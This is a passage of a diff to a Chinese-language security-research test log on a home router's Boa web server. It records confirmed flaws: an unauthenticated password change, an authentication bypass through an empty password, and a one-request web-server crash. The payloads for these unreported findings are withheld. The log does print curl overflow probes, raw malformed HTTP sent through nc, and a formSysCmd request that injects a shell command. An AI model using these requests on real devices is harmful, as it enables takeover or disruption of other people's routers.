+這一步燒掉了什麼: **H601 九個 byte**。已用裝置自己的 MIB 寫入器還原（見 T-37）
+驗證狀態(測後): dynamic   下一步: 其他 HW_* id 是不是也這樣寫得進去（開放 #35）
+🔴 **plan/W06 §二說這一寫落在 COMPCS。錯的 —— 落在 H601。** 而證據早就在 repo 裡：
+   W05 的模擬輸出同一行既印了 0x648a 也印了「H601 checksum」。
+   **我在動手前沒有把那兩句話接起來**，所以 T-29 的對照就已經寫進 H601 了。
+   H601 裝的是這台的 MAC 與射頻校準，出廠重置不還原。
+   我今早才蓋好一個「白名單讓 H601 搆不到」的寫入工具 —— **保護的是工具，不是裝置**。
 ```
 
-`COMPCS` 只動了 **2 欄**（`SYSCMD_SELECT`、`WPS_FIRST`）；`COMPDS` 動了 25 欄，
-**全部收斂到 `COMPCS` 的值** —— `D-10`，**今晚稍早那次還原被本場自己的 POST 蓋回去了。**
+```text
+T-32  P10-3  未認證改管理密碼                                23:3x
+可行性: ★★★★ 驗證狀態(測前): presumed   依據: formPasswordSetup 是寫入類 handler
+送出: **逐字內容依 docs/disclosure.md 保留（D-4，未通報）**；
+      handler 與參數見 test-ledger.md 的 P10-3。
+      參數名不是抄來的，是從這台自己的 password.htm 抓的：
+      Cusername / Cpassword（現行）+ username / newpass / confpass + submit-url
+原始回應: HTTP 302
+觀測通道 1（三種憑證各打一次 password.htm）:
+      baseline  old:200  new:302  none:302
+      T1 之後   old:302  new:200  none:302
+觀測通道 2: T1 是**完全不帶現行密碼欄位**的那一發 —— T2（帶錯的）與 T3（帶對的）
+            行為相同，所以 handler 根本不看那兩欄
+UART console 當下輸出: 無
+判定:  ✅ 成立，而且是最強的形式（第一發就成立）
+反證檢查: 測前寫下「被 301 擋下 → 門的涵蓋範圍不是純 URI 比對」，
+          實際看到 302 通過，密碼被換掉
+這一步燒掉了什麼: COMPCS 的 USER_NAME / USER_PASSWORD。已還原並雙向驗證
+驗證狀態(測後): dynamic   下一步: 逐 handler prior-art，然後才談通報
+⚠️ 第一次還原**沒生效**：`flash get` 顯示 USER_NAME 與 USER_PASSWORD **長度都是 0** ——
+   那次還原的變數被 WSL 派送剝掉，把使用者名稱也清空了。改用腳本檔重做才成功。
+```
 
-> 🔴 **程序修正：`A2.6` 的還原應該排在一場的最後，不是開頭。**
-> `runsheet` Part B 的 `B-W06` 寫的是「開場三件事」，那個順序在這台上是無效的。
+```text
+T-33  P10-4  把密碼設成空字串 → 全機無認證                    23:4x
+可行性: ★★★  驗證狀態(測前): static   依據: 0x0040bd18 的 beq，W04-2 逐指令讀
+送出: **逐字內容依 docs/disclosure.md 保留（D-4，未通報）**；見 test-ledger.md P10-4
+原始回應: HTTP 302
+觀測通道 1（完全不帶 Authorization 標頭）:
+      password.htm  200 / 5322 bytes 真實 HTML（baseline 是 302）
+      status.htm 200 · home.htm 200 · wlbasic.htm 200 · ddns.htm 200
+      wireless.htm 404（那一頁不在 bundle 裡，不是閘門結果）
+觀測通道 2（帶錯誤密碼）: password.htm **200** → 比對整段被跳過，不是空對空
+UART console 當下輸出: 無
+判定:  ✅ 成立
+反證檢查: 測前寫下「密碼設成空之後仍然要求認證 → 那個 beq 的語意讀錯了，X-9 撤回」，
+          實際看到 每一頁都是 200，X-9 站得住
+這一步燒掉了什麼: COMPCS 的 USER_PASSWORD。已還原
+驗證狀態(測後): dynamic   下一步: 與 T-32 合起來才是發現 —— D-4 那一列原本寫
+          「如果沒有未認證的路徑能把它設成空，這就是一個奇觀」。**那條路存在。**
+⚠️ 第一版四個 URL 是用迴圈變數組的，而 WSL 派送會把 $p 剝掉 —— **四個請求全部打在 /**，
+   四個 200 差一點變成頭條。用寫死路徑重做才是上面這份。
+```
 
-`USER_PASSWORD` 沒有淨變動 —— 那本身就是密碼還原成功的第三個證據。
-新基準：**`COMPCS` vs `COMPDS` 差 0 / 343**。
+```text
+T-34  P4-1 / P4-2 / P4-3 / P4-4  溢位群，以及三次打錯目標      23:5x–00:1x
+可行性: ★★★★/★★★★/★★★★★/★★★★★  驗證狀態(測前): other-build ×2 / static ×2
+依據: W04 在 V2.1.2 上量到 lastUrl[100] 與其後的兩個旗標
+送出（逐字，本項無未通報成分）:
+      curl -X POST http://10.1.1.1/boafrm/formNtp --data-urlencode "submit-url=/AAA…"
+      curl -X POST http://10.1.1.1/boafrm/formNtp --data 'submit-url='
+      curl -X POST http://10.1.1.1/boafrm/formNtp --data 'x=1'          # 缺席
+      curl -X POST http://10.1.1.1/boafrm/formWlanSetup --data-urlencode "ifname=BBB…"
+原始回應（P4-3 階梯，判準是 Location 回顯了多少）:
+      sent    8  HTTP 302  echoed    7 A
+      sent  100  HTTP 302  echoed   99 A
+      sent  400  HTTP 302  echoed  399 A
+      sent  800  HTTP 302  echoed  799 A     ← 完整回顯，100 處沒有截斷
+觀測通道 1: 每一發之後 curl -sf http://10.1.1.1/ → 全部 alive
+觀測通道 2: 裝置沒有自己重開機（needReboot 沒有被寫到）
+UART console 當下輸出: 無
+判定:  P4-1 ❌ · P4-2 ❌ · P4-3 ❌ · P4-4 ❌ —— 四項在這個 build 上都不成立
+反證檢查:
+      P4-1 測前寫「省略參數後 boa 正常回應且服務持續 → 這台的 handler 對缺席參數
+           有別的處理，X-2 只適用 2015」，實際看到 200/302 且服務持續
+      P4-2 測前寫「空值與缺席的行為相同 → 兩者其實是同一條路徑」，實際看到 相同
+      P4-3 測前寫「送 200 bytes 沒有任何可觀測變化 → 這個 .bss 佈局的推論錯了，
+           **或這條路徑根本沒被走到**」，實際看到 800 bytes 原樣回顯 →
+           **路徑走到了**，所以是前一半：這個 build 不用那個慣用語
+      P4-4 測前寫「20 B 那組用 100 B 的長度階梯就能觸發 → 兩組共用緩衝區」，
+           實際看到 兩組都沒有可觀測變化
+這一步燒掉了什麼: 各 handler 的設定欄位（COMPCS）
+驗證狀態(測後): dynamic ×4   下一步: D-2 從候選原創降為「V2.1.2 的發現，如此而已」
+⚠️ **三次打錯目標，三次都被自己抓到：**
+   1. formWlanRedirect —— 在 root_form[] 裡，**但不在 43 個碰 lastUrl 的函式裡**
+   2. formSelLang —— 碰 lastUrl，**但完全不看 submit-url**，永遠跳 countDownPage.htm
+   3. curl -X POST 不帶 body → HTTP 400，**測到的是解析器不是缺席的參數**
+   第三次才找到 formNtp，而它把 submit-url 回顯進 Location —— **那是正面證人**。
+```
+
+```text
+T-35  P2-6   HTTP 協定層畸形                                 00:2x
+可行性: ★★★  驗證狀態(測前): unverified   依據: Boa 0.94 對 chunked 支援很差
+送出（逐字）:
+      printf 'GET /\r\n\r\n'                                   | nc 10.1.1.1 80
+      printf 'GET / HTTP/9.9\r\nHost: x\r\n\r\n'                | nc 10.1.1.1 80
+      printf 'POST /boafrm/formSysCmd HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nsysCm\r\n0\r\n\r\n' | nc 10.1.1.1 80
+      printf 'GET /status.htm HTTP/1.1\r\n\r\n'                 | nc 10.1.1.1 80
+原始回應:
+      0.9 風格   → 裸 <html>，**沒有狀態行**（boa 講 HTTP/0.9）
+      HTTP/9.9   → HTTP/1.0 400 Bad Request
+      chunked    → HTTP/1.1 400 Bad Request
+      無 Host    → HTTP/1.1 200 OK（RFC 2616 要求 400 —— 規格偏差）
+觀測通道 1: 每一發之後 server 都 alive
+觀測通道 2: 無
+UART console 當下輸出: 無
+判定:  ✅ 成立（預測就是「回 400 而不是解析錯誤」）
+反證檢查: 測前寫下「boa 對所有畸形都正確回 400 → 這條收掉，不用再花時間」，
+          實際看到 兩個 400、一個 0.9 裸回應、一個該 400 卻 200 →
+          **不是「全部正確回 400」**，所以這條不收掉，但它是規格偏差不是記憶體安全
+這一步燒掉了什麼: 無
+驗證狀態(測後): dynamic   下一步: 無 Host 卻 200 這一條沒有安全後果，記著就好
+```
+
+```text
+T-36  —（無登記簿編號）一個未認證請求殺掉 web server          00:3x–00:5x
+可行性: —    驗證狀態(測前): 無 —— **這一項不在任何人的清單上**，
+             它是從一次 handler 普查裡掉出來的
+送出: **逐字內容依 docs/disclosure.md 保留（D-11，未通報）**；
+      形狀是一個只帶 submit-url 的合法 POST，handler 名不寫進本檔
+原始回應: **HTTP 000 —— curl 連回應都沒收到**
+觀測通道 1（乾淨開機之後的對照）:
+      formNtp #1  HTTP 302  alive
+      formNtp #2  HTTP 302  alive
+      formNtp #3  HTTP 302  alive      ← 三發同形狀，全部正常
+      目標      HTTP 000  DEAD        ← 第四發
+      5 秒後 DEAD ／ 30 秒後 DEAD
+觀測通道 2: ping 10.1.1.1 → 1.6 ms 正常。**裝置活著，只有 boa 不見了**
+UART console 當下輸出: **一行都沒有**（與 W05 那次一致）
+判定:  ✅ 成立（一個請求就夠）
+反證檢查: 測前寫下「三發對照裡任何一發也讓 server 消失 → 那就是『開機後第 N 個
+          請求』而不是這個 handler」，實際看到 三發全部正常，第四發死
+這一步燒掉了什麼: 一次開機循環。**第一次觀察到它是那次開機的第 13 個請求，
+          所以那次不足以宣稱** —— 多燒一次開機循環重做才有這張卡
+驗證狀態(測後): dynamic   下一步: 它是崩潰還是卡住？哪一種參數形狀觸發？
+          W05 那次服務中斷是不是同一個原因？三個都沒量。→ docs/disclosure.md D-11
+```
+
+```text
+T-37  P10-10 收工還原 + 基準線比對                            01:0x
+可行性: ★★★★★ 驗證狀態(測前): none   依據: 本場四份 64 KiB 快照
+送出（逐字）:
+      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
+        --data-urlencode 'sysCmd=flash set HW_WLAN0_WSC_PIN 99956042;#' \
+        --data 'submit-url=/syscmd.htm'
+      python3 -u tools/console-dump.py dump --at-prompt --flash 0x0 --length 0x10000 \
+        --ram 0x81000000 --chunk 16384 -o $D/w06-S4-final.bin
+原始回應: HTTP 302；dump sha256 450f99361a480500…，4 chunks，0 needed a re-read
+觀測通道 1（S2 注入前 vs S4 最後）:
+      boot loader   same        H601   same —— **0 個差異 byte**
+      COMPDS        DIFF        COMPCS DIFF
+      PIN as text   S2: 99956042    S4: 99956042
+觀測通道 2（更強的一條）:
+      H601 對 **8/16 完整 dump**（這個專案還沒寫過任何東西之前）: **byte-identical**
+      COMPCS 只動 2 欄（SYSCMD_SELECT、WPS_FIRST）
+      COMPDS 動 25 欄，全部收斂到 COMPCS 的值 = D-10
+      USER_PASSWORD **沒有淨變動** ← 密碼還原成功的第三個證據
+UART console 當下輸出: <RealTek>，正對照 0b f0 00 04 通過
+判定:  ✅ 成立
+反證檢查: 測前寫下「出現無法歸因的差異 byte → 有某個測試的副作用沒被記錄，
+          回頭找它，不要直接寫回備份把證據蓋掉」，實際看到 **沒有一個無法歸因的 byte**
+這一步燒掉了什麼: 本場合計：開機循環 8 次、H601 被寫 3 次（最終逐 byte 還原）、
+          COMPDS 還原一次又被本場的 POST 蓋回、管理密碼改 4 次（含一次意外清空
+          使用者名稱）最終還原並雙向驗證
+驗證狀態(測後): dynamic   下一步: **新基準：COMPCS vs COMPDS 差 0 / 343**
+🔴 **程序修正：A2.6 的還原屬於一場的最後，不是開頭。** runsheet Part B 的 B-W06
+   寫「開場三件事」，那個順序在這台上是無效的 —— 本場自己的 POST 又把它蓋回去了。
+```
 
 ## 這一場燒掉了什麼
 
